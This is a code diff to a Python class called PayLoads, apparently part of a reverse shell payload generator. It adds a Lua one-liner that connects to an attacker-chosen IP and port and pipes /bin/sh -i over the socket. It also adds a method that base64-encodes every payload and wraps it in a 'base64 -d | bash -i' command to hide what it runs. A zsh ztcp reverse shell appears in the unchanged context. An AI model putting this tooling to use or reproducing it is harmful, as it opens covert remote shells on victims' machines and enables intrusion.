@@ -24,6 +24,16 @@ class PayLoads:
             base64_payloads.append(base64_payload)
         return base64_payloads
 
+    def bash_space(self,payloads):
+        bash_space=[]
+        for payload in payloads:
+            cli = payload.encode("utf-8")
+            encoded = base64.b64encode(cli).decode('utf-8')
+            d=f'''bash -c "echo '{encoded}'" | base64 -d | bash -i'''
+            bash_space.append(d)
+        return bash_space
+
+
     def payloads(self):
         ip = self.ip
         port = self.port
@@ -58,8 +68,11 @@ class PayLoads:
 
         # zsh payloads
         ZSH = f'''zsh -c 'zmodload zsh/net/tcp && ztcp {ip} {port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY\''''
+        LUA=f'''lua -e "require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('/bin/sh -i <&3 >&3 2>&3');"'''
         payloads = [value for name, value in locals().items() if name.isupper()]
+        bash_space= self.bash_space(payloads)
         base64_payloads = self.base64_payloads(payloads)
+
         if self.use_node:
-            return self.nodejs(payloads + base64_payloads)
-        return payloads + base64_payloads
+            return self.nodejs(payloads + bash_space + base64_payloads)
+        return  payloads + bash_space + base64_payloads 
